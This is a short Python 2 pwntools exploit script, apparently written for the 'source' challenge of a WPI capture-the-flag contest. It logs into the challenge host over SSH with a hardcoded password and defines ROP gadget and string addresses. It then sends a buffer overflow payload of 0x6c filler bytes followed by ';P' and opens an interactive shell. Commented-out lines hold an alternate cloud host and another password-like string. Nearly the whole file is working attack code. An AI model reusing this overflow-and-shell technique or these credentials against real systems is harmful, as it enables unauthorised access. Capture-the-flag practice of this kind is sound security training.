#!/bin/python2
from pwn import *
bin='./source'

elf = ELF(bin)


#s = process(bin)
#s = ssh('roboman2444', 'ec2-3-83-182-58.compute-1.amazonaws.com', 31337, password='sourcelocker')
s = ssh('source', 'source.wpictf.xyz', 31337, password='sourcelocker').shell(tty=True)

#setenv_right = 0x0040080b
setenv_right = 0x00400780
#one_string = 0x00400901 # is the OG string for "1"
one_string = 0x00400881 # is the OG string for "1"

#poprsi = 0x004008c1 #is pop rdi, pop r15, ret
poprsi = 0x00400841 #is pop rdi, pop r15, ret

s.recvuntil('\n')
s.send('a' * 0x6c + ";P" + '\n')
#s.sendline('HuN7erTw0')	# more reliable?
s.interactive()